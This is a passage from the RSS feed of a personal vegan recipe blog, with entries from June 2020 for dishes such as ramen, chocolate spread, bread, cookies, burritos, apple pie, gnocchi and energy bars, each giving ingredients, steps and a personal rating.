&lt;img src="https://nicolasb.fr/recipes/2020/06/16/ramen/IMG_20200616_201822_hu49818ee542dc6e4fe9f11ed319c8efac_450441_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://www.youtube.com/watch?v=Ur9vOD5JE7Y">EASY VEGAN RAMEN | THE HAPPY PEAR #OILFREE - The Happy Pear&lt;/a>&lt;/p>
&lt;p>This took more than an hour to make. It&amp;rsquo;s enough for 4 people, and is easy to make.&lt;/p>
&lt;p>&lt;strong>I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.&lt;/strong>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>Those are absolutely delicious. Altough I&amp;rsquo;ve not tried a lot of ramens in my life, I could tell this was not bad at all. I&amp;rsquo;d give them a 5/5.&lt;/p></content></item><item><title>Basil Pesto Noodle</title><link>https://nicolasb.fr/recipes/2020/06/15/basil-pesto-noodle/</link><pubDate>Mon, 15 Jun 2020 14:28:54 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/15/basil-pesto-noodle/</guid><description>Recipe Source: Basil Pesto Noodles in 5 Minutes! | Cheap Easy Vegan - The Happy Pear
This took about 20min to make. It&amp;rsquo;s enough for 4 people, and is easy to make.
I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.
Results This is good, but maybe too simple? I&amp;rsquo;d give it a 4/5.</description><content>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://www.youtube.com/watch?v=5jJNo1CHdQE">Basil Pesto Noodles in 5 Minutes! | Cheap Easy Vegan - The Happy Pear&lt;/a>&lt;/p>
&lt;p>This took about 20min to make. It&amp;rsquo;s enough for 4 people, and is easy to make.&lt;/p>
&lt;p>&lt;strong>I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.&lt;/strong>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>This is good, but maybe too simple? I&amp;rsquo;d give it a 4/5.&lt;/p></content></item><item><title>Itxassou Cake</title><link>https://nicolasb.fr/recipes/2020/06/14/itxassou-cake/</link><pubDate>Sun, 14 Jun 2020 14:39:11 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/14/itxassou-cake/</guid><description>Recipe Source: La france vÃ©gÃ©talienne, p. 246.
This took about 2 hours to make. It&amp;rsquo;s enough for more than 5 people, and is relatively easy to make - I just struggled a bit to add the top layer.
I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.
Results The cake is really good, but the jam is a bit too much; it makes the taste a little too sugary.</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/14/itxassou-cake/IMG_2273.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/14/itxassou-cake/IMG_2273_huc11e381df803dc88dbb394b7490089fc_6327280_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://petite-collection-v.myshopify.com/collections/france-vegetalienne/products/la-france-vegetalienne">La france vÃ©gÃ©talienne&lt;/a>, p. 246.&lt;/p>
&lt;p>This took about 2 hours to make. It&amp;rsquo;s enough for more than 5 people, and is relatively easy to make - I just struggled a bit to add the top layer.&lt;/p>
&lt;p>&lt;strong>I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.&lt;/strong>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>The cake is really good, but the jam is a bit too much; it makes the taste a little too sugary. Overall, I&amp;rsquo;d give it a 4.25/5.&lt;/p></content></item><item><title>Chocolate Spread</title><link>https://nicolasb.fr/recipes/2020/06/13/chocolate-spread/</link><pubDate>Sat, 13 Jun 2020 21:05:44 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/13/chocolate-spread/</guid><description>Recipe Source: Cuisine vÃ©gane p. 19 - Ed. naumann &amp;amp; gÃ¶bel verlagsgesellschaft mbh
This took about half an hour to make. It&amp;rsquo;s enough to fill a relatively large jar (see the pictures), and is really easy to make.
Ingredients 50g of raw cane sugar 50g of roasted unsalted peanuts 85g of hazelnut powder 1/2 teaspoon of vanilla bean powder A pinch of salt 85g of sesame oil 3 tablespoons of cocoa powder 200ml of water Steps In a small saucepan, add the sugar and water together.</description><content>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: Cuisine vÃ©gane p. 19 - Ed. naumann &amp;amp; gÃ¶bel verlagsgesellschaft mbh&lt;/p>
&lt;p>This took about half an hour to make. It&amp;rsquo;s enough to fill a relatively large jar (see the pictures), and is really easy to make.&lt;/p>
&lt;h3 id="ingredients">Ingredients&lt;/h3>
&lt;ul>
&lt;li>50g of raw cane sugar&lt;/li>
&lt;li>50g of roasted unsalted peanuts&lt;/li>
&lt;li>85g of hazelnut powder&lt;/li>
&lt;li>1/2 teaspoon of vanilla bean powder&lt;/li>
&lt;li>A pinch of salt&lt;/li>
&lt;li>85g of sesame oil&lt;/li>
&lt;li>3 tablespoons of cocoa powder&lt;/li>
&lt;li>200ml of water&lt;/li>
&lt;/ul>
&lt;h3 id="steps">Steps&lt;/h3>
&lt;ul>
&lt;li>In a small saucepan, add the sugar and water together. Cook over medium heat, up until the sugar is dissolved.&lt;/li>
&lt;li>Meanwhile, finely mix the peanuts using a blender.&lt;/li>
&lt;li>Add the sugared water in the blender, and mix again.&lt;/li>
&lt;li>Add in the hazelnut powder, the vanilla, the salt, and the oil, then mix again until you get a homogeneous paste.&lt;/li>
&lt;li>Pour the mixture into a saucepan, and warm it over medium heat, without cooking it. Add the cocoa without stopping mixing.&lt;/li>
&lt;li>Once the mixture is smooth, remove the pan from the heat. Pour it into a jar, and let it sit.&lt;/li>
&lt;/ul>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>So the taste is really not what I was expecting, you almost can&amp;rsquo;t tell there&amp;rsquo;s chocolate in it, and you really only taste the peanuts and the hazelnuts.&lt;/p>
&lt;p>But, at the same time, I really like it. I enjoyed putting it on a slice of bread this morning.&lt;/p>
&lt;p>Apart from this, the texture is not really was I was expecting either. It&amp;rsquo;s more liquid than your typical chocolate spread.&lt;/p>
&lt;p>Overall, I&amp;rsquo;d give it a 4.5/5.&lt;/p></content></item><item><title>Bread</title><link>https://nicolasb.fr/recipes/2020/06/12/bread/</link><pubDate>Fri, 12 Jun 2020 18:29:18 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/12/bread/</guid><description>Recipe Source: Pain sans PÃ©trissage | Sain &amp;amp; 100% VÃ©gÃ©tal - Lloyd Lang
This took about 10 minutes to make (a little less than 2 hours if you count the baking time plus the waiting time). It&amp;rsquo;s really easy to make.
Ingredients 375g of flour 300ml of lukewarm water 12g of baker&amp;rsquo;s yeast (a sachet will work just fine - it&amp;rsquo;s what I used) Optional: salt, nuts, or anything you want in your bread.</description><content>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://www.youtube.com/watch?v=4d7pFDvNXE8">Pain sans PÃ©trissage | Sain &amp;amp; 100% VÃ©gÃ©tal - Lloyd Lang&lt;/a>&lt;/p>
&lt;p>This took about 10 minutes to make (a little less than 2 hours if you count the baking time plus the waiting time). It&amp;rsquo;s really easy to make.&lt;/p>
&lt;h3 id="ingredients">Ingredients&lt;/h3>
&lt;ul>
&lt;li>375g of flour&lt;/li>
&lt;li>300ml of lukewarm water&lt;/li>
&lt;li>12g of baker&amp;rsquo;s yeast (a sachet will work just fine - it&amp;rsquo;s what I used)&lt;/li>
&lt;li>Optional: salt, nuts, or anything you want in your bread.&lt;/li>
&lt;/ul>
&lt;h3 id="steps">Steps&lt;/h3>
&lt;ul>
&lt;li>In a large bowl, mix the baker&amp;rsquo;s yeast and the water, then, once it&amp;rsquo;s well diluted, let stand for 5 minutes.&lt;/li>
&lt;li>Add in the flour and mix well. This is where you can add salt, nuts or anything your want. The dough should be sticky.&lt;/li>
&lt;li>Cover the bowl with a clean tea towel, and put in your oven for one hour at 40Â°C.&lt;/li>
&lt;li>Meanwhile, add a baking sheet in a cake mold.&lt;/li>
&lt;li>Once the hour is up the dough should have expanded to twice its size. Preheat the oven to 220Â°C, and put the dough in the cake mold, and let it stand again for 5 minutes.&lt;/li>
&lt;li>Put it in the oven for 35 minutes.&lt;/li>
&lt;/ul>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>This seems like a really easy recipe that I can easily see myself doing every few days. I didn&amp;rsquo;t add salt this time, so that felt like it was missing.&lt;/p>
&lt;p>Overall, I&amp;rsquo;d give the bread a 4.5/5.&lt;/p></content></item><item><title>Cookies V2</title><link>https://nicolasb.fr/recipes/2020/06/11/cookies-v2/</link><pubDate>Thu, 11 Jun 2020 12:23:50 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/11/cookies-v2/</guid><description>Recipe Source: COOKIES AMERICAINS | VEGAN - La petite Okara
This took about 45min to make. It&amp;rsquo;s enough for 10 cookies, and is easy to make.
Ingredients 2 tablespoons of blond sugar 120g of whole sugar 50g of soy yogurt 120g of neutral oil 220g of flour (in France: T80) 1 teaspoon of baking powder 1/2 teaspoon of vanilla powder A pinch of salt 120g of chocolate - we used chocolate chips alongside chocolate chunks, so use what is available to you Steps Preheat your oven to 160Â°C.</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/11/cookies-v2/IMG_20200611_123026.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/11/cookies-v2/IMG_20200611_123026_huc112b8be9971c4df1bde58d877dca8bb_2009640_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://www.youtube.com/watch?v=c_jURDQSbcs">COOKIES AMERICAINS | VEGAN - La petite Okara&lt;/a>&lt;/p>
&lt;p>This took about 45min to make. It&amp;rsquo;s enough for 10 cookies, and is easy to make.&lt;/p>
&lt;h3 id="ingredients">Ingredients&lt;/h3>
&lt;ul>
&lt;li>2 tablespoons of blond sugar&lt;/li>
&lt;li>120g of whole sugar&lt;/li>
&lt;li>50g of soy yogurt&lt;/li>
&lt;li>120g of neutral oil&lt;/li>
&lt;li>220g of flour (in France: T80)&lt;/li>
&lt;li>1 teaspoon of baking powder&lt;/li>
&lt;li>1/2 teaspoon of vanilla powder&lt;/li>
&lt;li>A pinch of salt&lt;/li>
&lt;li>120g of chocolate - we used chocolate chips alongside chocolate chunks, so use what is available to you&lt;/li>
&lt;/ul>
&lt;h3 id="steps">Steps&lt;/h3>
&lt;ul>
&lt;li>Preheat your oven to 160Â°C.&lt;/li>
&lt;li>In a bowl, whisk together the blond sugar, the whole sugar, the soy yogurt and the oil.&lt;/li>
&lt;li>Add the flour, the baking powder, the vanilla powder and the salt. Mix again.&lt;/li>
&lt;li>Prepare your chocolate chunks if you&amp;rsquo;re using them. You could also use nuts, oreos, &amp;hellip;&lt;/li>
&lt;li>Add your chocolate, and mix again.&lt;/li>
&lt;li>Form the cookies using your hands, and add them to your baking tray (on a baking sheet). You want to make little disks, not balls (because it won&amp;rsquo;t come down when cooking). You should be able to make 10 of them.&lt;/li>
&lt;li>Cook in your oven for around 17 minutes.&lt;/li>
&lt;/ul>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>Those were way better than the ones I previously made, close to perfect. There sure is a lot of oil in them though.&lt;/p>
&lt;p>This time I made 18 of them, and they seem to last for at least 3 days without a problem.&lt;/p>
&lt;p>Overall, I&amp;rsquo;d give them a 5/5 - they&amp;rsquo;re delicious.&lt;/p></content></item><item><title>Burritos</title><link>https://nicolasb.fr/recipes/2020/06/10/burritos/</link><pubDate>Wed, 10 Jun 2020 13:59:57 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/10/burritos/</guid><description>Recipe Source: Black beans burritos | The Buddhist Chef
This took about 45min to make. It&amp;rsquo;s enough for 6 tortillas, and is easy to make.
Ingredients 540ml canned black beans 1 teaspoon cumin 1 teaspoon oregano 1 teaspoon garlic powder 1/4 teaspoon cayenne pepper 1/2 teaspoon salt 2 teaspoons agave nectar 125ml of water 125g brown rice Corn (2 teaspoons per tortilla) Avocados (count around an avocado and a half for 6 burritos) Salsa Tortillas Vegetable broth Steps Start cooking your rice, adding the vegetal broth, following the instructions on the pack.</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/10/burritos/IMG_20200610_205449.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/10/burritos/IMG_20200610_205449_huf8508526c70608664315d9b4fb5fa3c7_4345799_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://www.youtube.com/watch?v=hbYNfLs9vCE">Black beans burritos | The Buddhist Chef&lt;/a>&lt;/p>
&lt;p>This took about 45min to make. It&amp;rsquo;s enough for 6 tortillas, and is easy to make.&lt;/p>
&lt;h3 id="ingredients">Ingredients&lt;/h3>
&lt;ul>
&lt;li>540ml canned black beans&lt;/li>
&lt;li>1 teaspoon cumin&lt;/li>
&lt;li>1 teaspoon oregano&lt;/li>
&lt;li>1 teaspoon garlic powder&lt;/li>
&lt;li>1/4 teaspoon cayenne pepper&lt;/li>
&lt;li>1/2 teaspoon salt&lt;/li>
&lt;li>2 teaspoons agave nectar&lt;/li>
&lt;li>125ml of water&lt;/li>
&lt;li>125g brown rice&lt;/li>
&lt;li>Corn (2 teaspoons per tortilla)&lt;/li>
&lt;li>Avocados (count around an avocado and a half for 6 burritos)&lt;/li>
&lt;li>Salsa&lt;/li>
&lt;li>Tortillas&lt;/li>
&lt;li>Vegetable broth&lt;/li>
&lt;/ul>
&lt;h3 id="steps">Steps&lt;/h3>
&lt;ul>
&lt;li>Start cooking your rice, adding the vegetal broth, following the instructions on the pack.&lt;/li>
&lt;li>In a large pan, add the black beans, cumin, oregano, garlic powder, cayenne pepper, salt, agave nectar, and water. Stir for a bit over high-heat and then wait until the black beans absorb the liquid, reducing the heat a little. This should take around 5 minutes.&lt;/li>
&lt;li>Cut your avocados in thin slices.&lt;/li>
&lt;li>Then, for each tortilla:
&lt;ul>
&lt;li>You want to center all of the ingredients to be able to fold the burrito properly. See &lt;a href="https://www.youtube.com/watch?v=IAbpVXEUt_c">this tutorial&lt;/a>.&lt;/li>
&lt;li>Add a bit of salsa on the bottom of the tortilla.&lt;/li>
&lt;li>Add your rice on top, followed by the black beans, the corn, the avocado bits and again a layer of salsa.&lt;/li>
&lt;li>Fold the burritos. See the tutorial linked above.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>These were really tasty. I started adding the layer of salsa on the bottom after the third burrito or so, and it really adds something. Maybe next time I&amp;rsquo;ll try more daring ingredients.&lt;/p>
&lt;p>Overall, I&amp;rsquo;d give it a 4.5/5.&lt;/p></content></item><item><title>Apple Pie</title><link>https://nicolasb.fr/recipes/2020/06/09/apple-pie/</link><pubDate>Tue, 09 Jun 2020 20:34:00 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/09/apple-pie/</guid><description>Recipe Source : Vegan Apple Pie - Tasty
This took about 3 hours and a half to make (I was really slow). It&amp;rsquo;s enough for at least 5 people, and isn&amp;rsquo;t easy, but isn&amp;rsquo;t hard to make.
Ingredients 310g all-purpose flour (and a little bit extra if the dough gets sticky) 400g + 1 tablespoon + 1 teaspoon organic sugar 1 + 1/2 teaspoon salt 225g vegan butter (cubed and chilled) 6 tablespoons of ice water 7 apples (I only used 5) 1 lemon, zested (I didn&amp;rsquo;t put this in) 1/2 lemon, juiced (I used a tablesppon of lemon juice) 5 tablespoons cornstarch 1 tablespoon coconut oil + 1 teaspoon 4 teaspoons cinnamon Steps In a large bowl, combine the flour, sugar (a tablespoon) and salt (a teaspoon).</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/09/apple-pie/20200609202332_IMG_2254.JPG">
&lt;img src="https://nicolasb.fr/recipes/2020/06/09/apple-pie/20200609202332_IMG_2254_huf1f9ab4d99b05e0f6123d4808f0f061d_504105_1280x960_fit_q75_lanczos.JPG" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source : &lt;a href="https://www.youtube.com/watch?v=EObBCXJ3BeA&amp;amp;t=54s">Vegan Apple Pie - Tasty&lt;/a>&lt;/p>
&lt;p>This took about 3 hours and a half to make (I was really slow). It&amp;rsquo;s enough for at least 5 people, and isn&amp;rsquo;t easy, but isn&amp;rsquo;t hard to make.&lt;/p>
&lt;h3 id="ingredients">Ingredients&lt;/h3>
&lt;ul>
&lt;li>310g all-purpose flour (and a little bit extra if the dough gets sticky)&lt;/li>
&lt;li>400g + 1 tablespoon + 1 teaspoon organic sugar&lt;/li>
&lt;li>1 + 1/2 teaspoon salt&lt;/li>
&lt;li>225g vegan butter (cubed and chilled)&lt;/li>
&lt;li>6 tablespoons of ice water&lt;/li>
&lt;li>7 apples (I only used 5)&lt;/li>
&lt;li>1 lemon, zested (I didn&amp;rsquo;t put this in)&lt;/li>
&lt;li>1/2 lemon, juiced (I used a tablesppon of lemon juice)&lt;/li>
&lt;li>5 tablespoons cornstarch&lt;/li>
&lt;li>1 tablespoon coconut oil + 1 teaspoon&lt;/li>
&lt;li>4 teaspoons cinnamon&lt;/li>
&lt;/ul>
&lt;h3 id="steps">Steps&lt;/h3>
&lt;ul>
&lt;li>In a large bowl, combine the flour, sugar (a tablespoon) and salt (a teaspoon).&lt;/li>
&lt;li>Add the cubed butter, bit by bit, using a fork to work it into the flour until it breaks down.&lt;/li>
&lt;li>Gradually add the ice water and mix until the dough can be pressed together.&lt;/li>
&lt;li>Divide the dough in two parts, and shape them into discs. Wrap them in plastic and put them in the fridge for one hour.&lt;/li>
&lt;li>Preheat the oven to 180Â°C.&lt;/li>
&lt;li>Peel and core the apples, then cut them into thin slices. Put them in a large bowl and add sugar (200g), the lemon zest, cornstarch, lemon juice, 1 teaspoon of coconut oil, 1/2 teaspoon salt, and 3 teaspoons cinnamon. Toss until the apples are well-coated.&lt;/li>
&lt;li>On a lightly floured surface, roll both of the discs of dough to about 2cm thick. Transfer one to a greased 20cm pie dish, and gently press against the bottom and sides. Trim the excess dough around the edges, then prick the bottom of the pie crust all over with a fork.&lt;/li>
&lt;li>Pour the apples into the dish, and cover with the top crust. Trim the excess dough around the edges, then crimp the top and bottom crusts together with a fork.&lt;/li>
&lt;li>Brush the top of the crust with a tablespoon of coconut oil, sprinkle a teaspoon of sugar and cinnamon.&lt;/li>
&lt;li>Cut 4 vents in the top crust.&lt;/li>
&lt;li>Bake for one hour, until the crust is starting to turn golden brown.&lt;/li>
&lt;/ul>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>It was delicious, altough really heavy. Maybe there was too much sugar this time, I&amp;rsquo;d also like to try to perfect the top crust. The biggest pain point I can find is that it takes way too long to make - I spent almost the whole afternoon making it (because I&amp;rsquo;m still really slow at cooking).&lt;/p>
&lt;p>Overall, I&amp;rsquo;d give it a 4.75/5.&lt;/p></content></item><item><title>Vegan Omelet</title><link>https://nicolasb.fr/recipes/2020/06/08/vegan-omelet/</link><pubDate>Mon, 08 Jun 2020 12:35:54 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/08/vegan-omelet/</guid><description>Recipe Source : La france vÃ©gÃ©talienne p.40 - Ed. L'Ã‚ge d&amp;rsquo;Homme
This took about one hour to make. It&amp;rsquo;s enough for 4 people, and is easy to make.
Ingredients 250g mushrooms (paris mushroom if possible) 50g chickpea flour 200g silken tofu 2 tablespoons of cornstarch 10cl water A half teaspoon of turmeric 2 tablespoons of olive oil Vegetal oil (for cooking) Salt Pepper The herbs you like (we used chive) Steps Clean the mushrooms, and make them sweat in an oiled pan for 5 minutes.</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/08/vegan-omelet/IMG_20200608_131224.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/08/vegan-omelet/IMG_20200608_131224_hu2210e8228ed762f7d5ddb9cc7c5f11d2_5244470_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source : La france vÃ©gÃ©talienne p.40 - Ed. L'Ã‚ge d&amp;rsquo;Homme&lt;/p>
&lt;p>This took about one hour to make. It&amp;rsquo;s enough for 4 people, and is easy to make.&lt;/p>
&lt;h3 id="ingredients">Ingredients&lt;/h3>
&lt;ul>
&lt;li>250g mushrooms (paris mushroom if possible)&lt;/li>
&lt;li>50g chickpea flour&lt;/li>
&lt;li>200g silken tofu&lt;/li>
&lt;li>2 tablespoons of cornstarch&lt;/li>
&lt;li>10cl water&lt;/li>
&lt;li>A half teaspoon of turmeric&lt;/li>
&lt;li>2 tablespoons of olive oil&lt;/li>
&lt;li>Vegetal oil (for cooking)&lt;/li>
&lt;li>Salt&lt;/li>
&lt;li>Pepper&lt;/li>
&lt;li>The herbs you like (we used chive)&lt;/li>
&lt;/ul>
&lt;h3 id="steps">Steps&lt;/h3>
&lt;ul>
&lt;li>Clean the mushrooms, and make them sweat in an oiled pan for 5 minutes.&lt;/li>
&lt;li>In a small bowl, mix the tofu, water, oil, flour, cornstarch, turmeric and salt until it&amp;rsquo;s smooth.&lt;/li>
&lt;li>Pour the mixture into a hot pan.&lt;/li>
&lt;li>Let it cook until the bottom is golden brown, and the top isn&amp;rsquo;t liquid anymore.&lt;/li>
&lt;li>Add the mushrooms and fold the omelet in half.&lt;/li>
&lt;li>Add the herbs.&lt;/li>
&lt;/ul>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>We didn&amp;rsquo;t manage to cut the omelet into parts without destroying its structure, and it was still a little bit too liquid on top. But it was still good.&lt;/p>
&lt;p>Overall, I&amp;rsquo;d give it a 4/5.&lt;/p></content></item><item><title>Gnocchis</title><link>https://nicolasb.fr/recipes/2020/06/07/gnocchis/</link><pubDate>Sun, 07 Jun 2020 14:56:08 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/07/gnocchis/</guid><description>Recipe Source : GNOCCHI VEGAN | Sain &amp;amp; Facile - Lloyd Lang
This took 2 hours and a half to prepare - altough I was slow at the beginning. It&amp;rsquo;s enough for 5 people.
Ingredients 1kg of potatoes 350g flour Steps Cook the potatoes using a steam cooker. Mash them in a large bowl, until you can&amp;rsquo;t find little potato chunks. Don&amp;rsquo;t mix for too long - It&amp;rsquo;ll make the gnocchis too elastic.</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/07/gnocchis/20200607142420_IMG_2214.JPG">
&lt;img src="https://nicolasb.fr/recipes/2020/06/07/gnocchis/20200607142420_IMG_2214_hubdc8237b3458cde6f8dad5e73b72c17f_444431_1280x960_fit_q75_lanczos.JPG" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source : &lt;a href="https://www.youtube.com/watch?v=udrsuOpXAmQ">GNOCCHI VEGAN | Sain &amp;amp; Facile - Lloyd Lang&lt;/a>&lt;/p>
&lt;p>This took 2 hours and a half to prepare - altough I was slow at the beginning. It&amp;rsquo;s enough for 5 people.&lt;/p>
&lt;h3 id="ingredients">Ingredients&lt;/h3>
&lt;ul>
&lt;li>1kg of potatoes&lt;/li>
&lt;li>350g flour&lt;/li>
&lt;/ul>
&lt;h3 id="steps">Steps&lt;/h3>
&lt;ul>
&lt;li>Cook the potatoes using a steam cooker.&lt;/li>
&lt;li>Mash them in a large bowl, until you can&amp;rsquo;t find little potato chunks. Don&amp;rsquo;t mix for too long - It&amp;rsquo;ll make the gnocchis too elastic.&lt;/li>
&lt;li>Add in the flour, and mix until it&amp;rsquo;s getting too hard.&lt;/li>
&lt;li>Put the dough on a flat surface, and use your hands to finish mixing it, forming a large cylinder.&lt;/li>
&lt;li>Cut roughly 2cm slices, molding them into longer cylinders. Cut each cylinder into small pieces - about a bite size.&lt;/li>
&lt;li>Use a fork to imprint the stripes of a gnocchi into each piece.&lt;/li>
&lt;li>Put the gnocchis into boiling water ; they&amp;rsquo;ll cook in a few minutes if not less. You&amp;rsquo;ll know they&amp;rsquo;re ready when they come up to the surface.&lt;/li>
&lt;li>[Optional] Put the gnocchis into a large pan, with a bit of olive oil,&lt;/li>
&lt;/ul>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>The gnocchis were good - but not that great when eaten alone. Adding a bit of tomato sauce on top was a game changer.&lt;/p>
&lt;p>Overall, I&amp;rsquo;d give them a 4.25/5.&lt;/p></content></item><item><title>Energy Bars</title><link>https://nicolasb.fr/recipes/2020/06/06/energy-bars/</link><pubDate>Sat, 06 Jun 2020 16:12:32 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/06/energy-bars/</guid><description>Recipe Source : Homemade Energy Bars - So Vegan
This took about 1h20 to prepare and bake, and produces around 10 energy bars (9 on the pictures, plus an extra one). It&amp;rsquo;s really easy to make.
Ingredients 85g oats 85g pumpkin seeds 150g almonds 80g raw buckwheat groats 70g raisins 70g dried cranberries 170g soft dried apricots 4 tablespoons of maple syrup 4 tablespoons of water Steps Preheat the oven to 180Â°c, and prepare a large (the original said 18x18cm) square tin with greaseproof paper.</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/06/energy-bars/20200606165442_IMG_2200.JPG">
&lt;img src="https://nicolasb.fr/recipes/2020/06/06/energy-bars/20200606165442_IMG_2200_hucc1ad4983190a46b780ad7bb08b80c8d_478951_1280x960_fit_q75_lanczos.JPG" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source : &lt;a href="https://www.wearesovegan.com/homemade-energy-bars/">Homemade Energy Bars - So Vegan&lt;/a>&lt;/p>
&lt;p>This took about 1h20 to prepare and bake, and produces around 10 energy bars (9 on the pictures, plus an extra one). It&amp;rsquo;s really easy to make.&lt;/p>
&lt;h3 id="ingredients">Ingredients&lt;/h3>
&lt;ul>
&lt;li>85g oats&lt;/li>
&lt;li>85g pumpkin seeds&lt;/li>
&lt;li>150g almonds&lt;/li>
&lt;li>80g raw buckwheat groats&lt;/li>
&lt;li>70g raisins&lt;/li>
&lt;li>70g dried cranberries&lt;/li>
&lt;li>170g soft dried apricots&lt;/li>
&lt;li>4 tablespoons of maple syrup&lt;/li>
&lt;li>4 tablespoons of water&lt;/li>
&lt;/ul>
&lt;h3 id="steps">Steps&lt;/h3>
&lt;ul>
&lt;li>Preheat the oven to 180Â°c, and prepare a large (the original said 18x18cm) square tin with greaseproof paper. We used a silicon mold instead.&lt;/li>
&lt;li>Line a large baking tray with greaseproof paper. Spread the oats, pumpkin seeds and almonds evenly accross the tray, then roast for 10min.&lt;/li>
&lt;li>While it&amp;rsquo;s cooking, mix the apricots, maple syrup and water in a blender until it becomes a smooth paste. You can add water if the blender is struggling.&lt;/li>
&lt;li>Transfer the apricot mixture to a mixing bowl along with the buckwheat groats, raisins and cranberries.&lt;/li>
&lt;li>Remove the baking tray from the oven and transfer the oats, pumpkin seeds and almonds to the large mixing bowl, and give everything a good mix. Leave the oven turned on.&lt;/li>
&lt;li>Transfer the mixture to the square tin. Make sure it&amp;rsquo;s compact, or the bars will crumble afterwards. Bake for 20min.&lt;/li>
&lt;li>Remove the tin from the oven and leave it to cool completely. Don&amp;rsquo;t try to slice the bars before it&amp;rsquo;s cooled, it will once again make the bars crumble afterwards.&lt;/li>
&lt;li>Take the mixture out of the tin, and slice it into 10 energy bars.&lt;/li>
&lt;/ul>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>The bars are really good! Next time I make some, I&amp;rsquo;ll probably try to use other cheaper ingredients - the 10 bars I made cost roughly 15â‚¬.&lt;/p>
&lt;p>Overall, I&amp;rsquo;d give them a 4.5/5.&lt;/p></content></item><item><title>Banana Bread</title><link>https://nicolasb.fr/recipes/2020/06/05/banana-bread/</link><pubDate>Fri, 05 Jun 2020 17:26:55 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/05/banana-bread/</guid><description>Recipe Source : The perfect {vegan} banana bread - Valentina | The Baking Fairy
This took about an hour to prepare and bake, and is not too hard to make.
Ingredients 4 medium ripe bananas 60ml vegetable oil 60ml unsweetened nondairy milk 125g light brown sugar 2 teaspoons pure vanilla extract 260g unbleached all-purpose flour (in France : T80 flour) 1 teaspoon cinnamon 1 teaspoon baking soda 1/2 teaspoon salt A sliced banana, for topping Steps Preheat the oven at 175Â°C.</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/05/banana-bread/20200605170040_IMG_2176.JPG">
&lt;img src="https://nicolasb.fr/recipes/2020/06/05/banana-bread/20200605170040_IMG_2176_hud7b0688e27df5f97eb64d80e01020db1_469298_1280x960_fit_q75_lanczos.JPG" style="width: 100%" />
&lt;/a>
&lt;a href="https://nicolasb.fr/recipes/2020/06/05/banana-bread/IMG_20200605_165723.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/05/banana-bread/IMG_20200605_165723_hu6082a4f799535cf18675ed6c9905baed_4971421_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source : &lt;a href="https://www.thebakingfairy.net/2015/05/the-perfect-vegan-banana-bread/">The perfect {vegan} banana bread - Valentina | The Baking Fairy&lt;/a>&lt;/p>
&lt;p>This took about an hour to prepare and bake, and is not too hard to make.&lt;/p>
&lt;h3 id="ingredients">Ingredients&lt;/h3>
&lt;ul>
&lt;li>4 medium ripe bananas&lt;/li>
&lt;li>60ml vegetable oil&lt;/li>
